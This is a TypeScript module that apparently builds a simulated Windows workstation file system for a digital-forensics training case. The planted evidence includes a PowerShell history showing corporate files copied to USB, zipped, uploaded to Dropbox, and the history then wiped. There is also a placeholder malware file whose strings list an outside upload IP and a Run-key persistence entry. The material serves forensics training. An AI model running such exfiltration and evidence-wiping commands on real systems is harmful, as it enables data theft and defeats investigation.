import type { FileTreeNode } from '@/data/cases/caseData.types';

export type VfsFileNode = {
  kind: 'file';
  name: string;
  content: string;
  hidden?: boolean;
  system?: boolean;
  readonly?: boolean;
  archive?: boolean;
  binary?: boolean;
  sha256?: string;
  md5?: string;
  sha1?: string;
  strings?: string[];
};

export type VfsDirNode = {
  kind: 'dir';
  name: string;
  children: Map<string, VfsDirNode | VfsFileNode>;
  hidden?: boolean;
  system?: boolean;
};

function hashesFor(pathLower: string): Pick<VfsFileNode, 'md5' | 'sha1' | 'sha256'> {
  const pad = (s: string, n: number) => (s + '0'.repeat(n)).slice(0, n);
  const h = Array.from(pathLower).reduce((a, c) => a + c.charCodeAt(0), 0);
  return {
    md5: pad(h.toString(16), 32),
    sha1: pad((h * 31).toString(16), 40),
    sha256: pad((h * 131).toString(16), 64),
  };
}

function mkDir(name: string, hidden?: boolean): VfsDirNode {
  return { kind: 'dir', name, children: new Map(), hidden };
}

function mkFile(name: string, content: string, opts?: Partial<VfsFileNode>): VfsFileNode {
  const lower = name.toLowerCase();
  const h = hashesFor(lower);
  return {
    kind: 'file',
    name,
    content,
    archive: true,
    binary: opts?.binary ?? false,
    hidden: opts?.hidden,
    md5: opts?.md5 ?? h.md5,
    sha1: opts?.sha1 ?? h.sha1,
    sha256: opts?.sha256 ?? h.sha256,
    strings: opts?.strings,
  };
}

function mergeTreeIntoDir(parent: VfsDirNode, node: FileTreeNode, name: string) {
  if (node.type === 'file') {
    parent.children.set(name, mkFile(name, node.content ?? '', { hidden: node.hidden }));
    return;
  }
  const dir = mkDir(name, node.hidden);
  parent.children.set(name, dir);
  if (!node.children) return;
  for (const [childName, child] of Object.entries(node.children)) {
    mergeTreeIntoDir(dir, child, childName);
  }
}

export function mountWorkstationTree(workspace: VfsDirNode, tree: FileTreeNode) {
  if (tree.type !== 'dir' || !tree.children) return;
  for (const [childName, child] of Object.entries(tree.children)) {
    mergeTreeIntoDir(workspace, child, childName);
  }
}

export function buildWorkstationVfs(
  tree: FileTreeNode | undefined,
  username: string,
): VfsDirNode {
  const root = mkDir('C:');
  root.hidden = true;
  const users = mkDir('Users');
  root.children.set('Users', users);

  const prof = mkDir(username);
  users.children.set(username, prof);

  for (const sub of ['Desktop', 'Documents', 'Downloads']) {
    prof.children.set(sub, mkDir(sub));
  }

  const appData = mkDir('AppData');
  prof.children.set('AppData', appData);
  const local = mkDir('Local');
  appData.children.set('Local', local);
  const temp = mkDir('Temp');
  local.children.set('Temp', temp);

  const workspace = mkDir('Workspace');
  prof.children.set('Workspace', workspace);

  if (tree) mountWorkstationTree(workspace, tree);

  const psRead = mkDir('Microsoft');
  local.children.set('Microsoft', psRead);
  const win = mkDir('Windows');
  psRead.children.set('Windows', win);
  const ps = mkDir('PowerShell');
  win.children.set('PowerShell', ps);
  const psReadLine = mkDir('PSReadLine');
  ps.children.set('PSReadLine', psReadLine);
  psReadLine.children.set(
    'ConsoleHost_history.txt',
    mkFile(
      'ConsoleHost_history.txt',
      [
        `Get-ChildItem C:\\Users\\${username}\\Documents -Recurse`,
        'Copy-Item "\\\\corp-fs01\\product-roadmap" -Destination "E:\\" -Recurse',
        'Compress-Archive -Path "E:\\product-roadmap" -DestinationPath "E:\\archive.zip"',
        'Get-FileHash "E:\\archive.zip"',
        'Invoke-WebRequest -Uri "https://www.dropbox.com/upload" -Method POST -InFile "E:\\archive.zip"',
        'Clear-History',
        `Remove-Item "C:\\Users\\${username}\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"`,
      ].join('\r\n'),
    ),
  );

  temp.children.set(
    'winsvc32.exe',
    mkFile('winsvc32.exe', '[BINARY PLACEHOLDER]', {
      binary: true,
      hidden: true,
      strings: [
        'KERNEL32.dll',
        'http://185.220.101.47/upload',
        'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run',
        'WindowsUpdateHelper',
      ],
      sha256: 'e3b0c44298fc1c149afb4c8996fb92427ae41e4649b934ca495991b7852b855',
      md5: 'a1b2c3d4e5f6789012345678901234ab',
      sha1: 'da39a3ee5e6b4b0d3255bfef95601890afd80709',
    }),
  );

  return root;
}

export function normalizeWindowsPath(p: string): string {
  return p.trim().replace(/\//g, '\\');
}

export function resolveWindowsPath(cwd: string, target: string): string | null {
  const t = target.trim();
  const cwdN = normalizeWindowsPath(cwd);
  const dm = cwdN.match(/^([a-z]:)(.*)$/i);
  if (!dm) return null;
  const drive = dm[1].toUpperCase();
  const cwdRest = dm[2].replace(/^\\/, '').split('\\').filter(Boolean);

  if (/^[a-z]:\\/i.test(t)) {
    return normalizeWindowsPath(t);
  }
  if (t === '\\' || t === '/') {
    return `${drive}\\`;
  }

  const parts = [...cwdRest];
  const tokens = t.split(/\\+/).filter((x) => x.length);
  for (const tok of tokens) {
    if (tok === '..') {
      if (parts.length) parts.pop();
    } else if (tok !== '.') parts.push(tok);
  }
  return parts.length ? `${drive}\\${parts.join('\\')}` : `${drive}\\`;
}

export function walkVfs(
  root: VfsDirNode,
  absPath: string,
): { node: VfsDirNode | VfsFileNode; parent: VfsDirNode | null; name: string } | null {
  const norm = normalizeWindowsPath(absPath);
  const m = norm.match(/^([a-z]):\\?(.*)$/i);
  if (!m) return null;
  const drive = m[1].toUpperCase();
  const rest = m[2] ? m[2].split('\\').filter(Boolean) : [];
  if (drive !== 'C') return null;

  let cur: VfsDirNode | VfsFileNode = root;
  let parent: VfsDirNode | null = null;
  let name = 'C:';
  const rootName = 'C:';
  if (!rest.length) {
    return { node: cur, parent: null, name: rootName };
  }

  for (const seg of rest) {
    if (cur.kind !== 'dir') return null;
    parent = cur;
    const nextChild: VfsDirNode | VfsFileNode | undefined =
      cur.children.get(seg) ??
      [...cur.children.entries()].find(([k]) => k.toLowerCase() === seg.toLowerCase())?.[1];
    if (!nextChild) return null;
    cur = nextChild;
    name = seg;
  }
  return { node: cur, parent, name };
}
